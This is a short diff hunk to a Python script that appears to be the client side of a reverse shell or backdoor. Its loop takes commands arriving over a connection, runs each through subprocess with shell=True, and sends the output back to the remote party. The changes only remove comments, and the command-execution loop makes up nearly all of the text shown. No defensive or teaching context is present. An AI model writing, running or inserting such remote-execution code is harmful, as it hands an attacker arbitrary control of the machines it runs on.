@@ -20,15 +20,13 @@ while True:
 		payload.close()
 		break
 		
-	cmd = cmd.decode("utf-8") # string
+	cmd = cmd.decode("utf-8")
 
-	# Handle Exception
 	try:
 		output = subprocess.check_output(cmd, shell = True)
-	# Check if there's exception
 	except subprocess.CalledProcessError:
 		send_data(b"Wrong command")
 	else:
 		send_data(output)
 
-print("Disconnected") # display disconnection message
+print("Disconnected")
